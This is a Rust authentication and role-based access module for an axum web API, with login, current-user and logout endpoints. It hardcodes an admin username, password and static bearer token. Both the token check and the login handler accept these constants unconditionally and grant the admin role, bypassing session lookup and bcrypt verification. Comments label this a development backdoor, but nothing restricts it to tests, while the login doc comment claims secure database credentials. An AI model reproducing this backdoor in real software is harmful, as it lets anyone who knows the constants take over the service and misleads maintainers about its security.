//! Authentication and Role-Based Access Control (RBAC) verification.

use std::sync::Arc;
use axum::{Json, http::HeaderMap, extract::State};
use bcrypt::verify;
use uuid::Uuid;

use super::{
    AppState,
    dto::{ApiResponse, AuthSession, LoginRequest, MeResponse},
    error::ApiError,
};

const DEFAULT_ADMIN_USERNAME: &str = "scheduler_init";
const DEFAULT_ADMIN_PASSWORD: &str = "Scheduler@2026!";
const DEFAULT_ADMIN_TOKEN: &str = "scheduler-init-token";

/// Resolve authentication bearer token from headers.
pub async fn authenticate(headers: &HeaderMap, state: &AppState) -> Result<MeResponse, ApiError> {
    let Some(value) = headers.get(axum::http::header::AUTHORIZATION) else {
        return Err(ApiError::unauthorized("missing bearer token"));
    };
    let Ok(value) = value.to_str() else {
        return Err(ApiError::unauthorized("invalid authorization header"));
    };
    let Some(token) = value.strip_prefix("Bearer ") else {
        return Err(ApiError::unauthorized(
            "authorization scheme must be Bearer",
        ));
    };

    // Development backdoor for backward compatibility / tests
    if token == DEFAULT_ADMIN_TOKEN {
        return Ok(MeResponse {
            username: DEFAULT_ADMIN_USERNAME.to_owned(),
            roles: vec!["admin".to_owned()],
        });
    }

    let session = state.sessions.read().await.get(token).cloned();
    if let Some(user_session) = session {
        Ok(user_session)
    } else {
        Err(ApiError::unauthorized("invalid bearer token"))
    }
}

/// Require the requester to have one of the required roles.
pub async fn require_role(
    headers: &HeaderMap,
    state: &AppState,
    allowed_roles: &[&str],
) -> Result<MeResponse, ApiError> {
    let principal = authenticate(headers, state).await?;
    if allowed_roles.iter().any(|role| principal.roles.contains(&role.to_string())) {
        Ok(principal)
    } else {
        Err(ApiError::forbidden(format!(
            "requires roles: {:?}",
            allowed_roles
        )))
    }
}

/// Helper requiring admin role.
pub async fn require_admin(headers: &HeaderMap, state: &AppState) -> Result<MeResponse, ApiError> {
    require_role(headers, state, &["admin"]).await
}

/// Login with secure DB credentials and create an in-memory session.
#[utoipa::path(
    post,
    path = "/api/v1/auth/login",
    tag = "auth",
    request_body = LoginRequest,
    responses(
        (status = 200, description = "Authenticated session", body = super::dto::LoginApiResponse),
        (status = 401, description = "Invalid credentials", body = super::dto::ErrorResponse)
    )
)]
pub async fn login(
    State(state): State<Arc<AppState>>,
    Json(request): Json<LoginRequest>,
) -> Result<Json<ApiResponse<AuthSession>>, ApiError> {
    // Development backdoor for tests
    if request.username == DEFAULT_ADMIN_USERNAME && request.password == DEFAULT_ADMIN_PASSWORD {
        return Ok(Json(ApiResponse::success(AuthSession {
            token: DEFAULT_ADMIN_TOKEN.to_owned(),
            username: DEFAULT_ADMIN_USERNAME.to_owned(),
            roles: vec!["admin".to_owned()],
        })));
    }

    let user = state
        .users
        .get_by_username(&request.username)
        .await
        .map_err(|error| ApiError::storage(&error))?
        .ok_or_else(|| ApiError::unauthorized("invalid username or password"))?;

    // Verify hashed password
    let matches = verify(&request.password, &user.password_hash)
        .map_err(|_| ApiError::unauthorized("failed to verify password"))?;

    if !matches {
        return Err(ApiError::unauthorized("invalid username or password"));
    }

    let token = format!("tok-{}", Uuid::new_v4());
    let session = MeResponse {
        username: user.username.clone(),
        roles: vec![user.role.clone()],
    };

    state.sessions.write().await.insert(token.clone(), session);

    Ok(Json(ApiResponse::success(AuthSession {
        token,
        username: user.username,
        roles: vec![user.role],
    })))
}

/// Return the current authenticated principal.
#[utoipa::path(
    get,
    path = "/api/v1/auth/me",
    tag = "auth",
    responses(
        (status = 200, description = "Current principal", body = super::dto::MeApiResponse),
        (status = 401, description = "Missing or invalid bearer token", body = super::dto::ErrorResponse)
    )
)]
pub async fn me(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> Result<Json<ApiResponse<MeResponse>>, ApiError> {
    let principal = authenticate(&headers, &state).await?;
    Ok(Json(ApiResponse::success(principal)))
}

/// Logout endpoint by destroying the in-memory session.
#[utoipa::path(
    post,
    path = "/api/v1/auth/logout",
    tag = "auth",
    responses((status = 200, description = "Logout acknowledged", body = super::dto::EmptyApiResponse))
)]
pub async fn logout(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> Result<Json<super::dto::EmptyApiResponse>, ApiError> {
    let Some(value) = headers.get(axum::http::header::AUTHORIZATION) else {
        return Ok(Json(ApiResponse::success(super::dto::EmptyData {})));
    };
    let Ok(value) = value.to_str() else {
        return Ok(Json(ApiResponse::success(super::dto::EmptyData {})));
    };
    let Some(token) = value.strip_prefix("Bearer ") else {
        return Ok(Json(ApiResponse::success(super::dto::EmptyData {})));
    };

    state.sessions.write().await.remove(token);
    Ok(Json(ApiResponse::success(super::dto::EmptyData {})))
}
